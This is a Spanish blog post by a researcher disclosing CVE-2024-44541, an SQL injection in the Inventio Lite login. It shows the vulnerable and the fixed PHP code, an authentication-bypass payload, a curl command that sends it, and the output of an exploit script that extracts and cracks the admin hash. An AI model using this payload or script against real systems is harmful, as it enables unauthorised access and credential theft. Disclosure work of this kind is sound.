+++
author = "Andr茅s Del Cerro"
title = "Mi primer CVE - CVE-2024-44541"
date = "2024-08-03"
description = ""
tags = [
    "Cybersecurity",
    "Penetration Testing",
    "Web Hacking",
    "CVE",
    "Informative",
    "CVE-2024-44541"
]

+++

# Introducci贸n:

Recientemente, descubr铆 mi primer CVE, un hito importante en mi trayectoria en ciberseguridad. Aqu铆 comparto brevemente el proceso.
驴Qu茅 es un CVE?

CVE (Common Vulnerabilities and Exposures) es un sistema que identifica y categoriza vulnerabilidades de seguridad en software, permitiendo que se reporte y solucione de manera coordinada.
El Descubrimiento

---

# C贸digo Vulnerable

El c贸digo vulnerable se encuentra en el archivo de login, donde la entrada del usuario no se escapa adecuadamente antes de ser incluida en la consulta SQL:
```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();
    $sql = "select * from user where (email= \"".$user."\" or username= \"".$user."\") and password= \"".$pass."\" and is_active=1";
    $query = $con->query($sql);
    $found = false;
    $userid = null;
    while($r = $query->fetch_array()){
        $found = true;
        $userid = $r['id'];
    }
}
```
En esta implementaci贸n, el par谩metro `username` se concatena directamente en la consulta SQL, permitiendo la inyecci贸n de c贸digo malicioso.

---

# C贸digo Corregido
La vulnerabilidad se solucion贸 utilizando consultas **preparadas**, que permiten escapar adecuadamente las entradas del usuario y evitar la inyecci贸n SQL:
```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();

    // Preparar la consulta
    $stmt = $con->prepare("
        SELECT * FROM user 
        WHERE (email = ? OR username = ?) 
        AND password = ? 
        AND is_active = 1
    ");

    // Vincular los par谩metros
    $stmt->bind_param("sss", $user, $user, $pass);

    // Ejecutar la consulta
    $stmt->execute();

    // Obtener los resultados
    $result = $stmt->get_result();
    $found = false;
    $userid = null;

    while($r = $result->fetch_assoc()){
        $found = true;
        $userid = $r['id'];
    }

    // Cerrar la declaraci贸n
    $stmt->close();
}
```

---

# Explotaci贸n
## Payload de Bypass de Autenticaci贸n
Un atacante puede explotar esta vulnerabilidad utilizando un payload como el siguiente para eludir la autenticaci贸n:
```text
username -> ") or 1=1-- -
password -> cualquier_valor
```

**Ejemplo de explotaci贸n con** `curl`:
```console
$ curl -X POST http://URL_INVENTIO_LITE/inventio-lite/?action=processlogin -d 'username=%22%29%20or%201%3D1--%20-&password=blablabla' -v && echo ""
```

# Script de Explotaci贸n Autom谩tica
He desarrollado un script en Python que automatiza la extracci贸n del nombre de usuario y hash de la contrase帽a del administrador, y luego intenta descifrar la contrase帽a.

Para usar el script, clona el repositorio y ejecuta el script:

```console
$ git clone https://github.com/pointedsec/CVE-2024-44541
$ pip install -r requirements.txt
$ python3 sqli.py
```
**Ejemplo de salida del script**
```console
[*] Checking if target is vulnerable
[+] Target Vulnerable!
[*] Dumping Administrator username...
[] Extracting Username: -> POINTEDSEC@GMAIL.COM
[/] Extracting Admin Password Hash: Final Admin Hash: 90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad
[+] Password Decrypted! -> POINTEDSEC@GMAIL.COM:admin
```

---

# Impacto
La explotaci贸n de esta vulnerabilidad puede tener las siguientes consecuencias:
- **Confidencialidad**: Los atacantes pueden extraer toda la base de datos, accediendo a informaci贸n sensible como credenciales de usuarios, correos electr贸nicos y otros datos personales.
- **Integridad**: Un atacante podr铆a obtener acceso administrativo, permitiendo modificar, agregar o eliminar datos en la aplicaci贸n.

---
#Referencias

- [Inventio Lite GitHub Repository](https://github.com/evilnapsis/inventio-lite)
- [CVE-2024-44541 en MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44541)
- [Alerta en INCIBE](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-44541)
- [Detalle en NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-44541)

---

# Cr茅ditos
Este CVE fue descubierto y reportado por Andr茅s Del Cerro (alias: pointedsec, yo jejeje). Si necesitas m谩s informaci贸n, no dudes en contactarme a trav茅s de pointedpentesting@gmail.com.

---

# Conclusi贸n
Despu茅s de validar la vulnerabilidad, proced铆 con su divulgaci贸n responsable, colaborando con el equipo de seguridad afectado para resolverla.

Descubrir y reportar un CVE ha sido una experiencia educativa, reforzando mi enfoque en la seguridad inform谩tica y motiv谩ndome a seguir contribuyendo a este campo.

Happy Hacking! 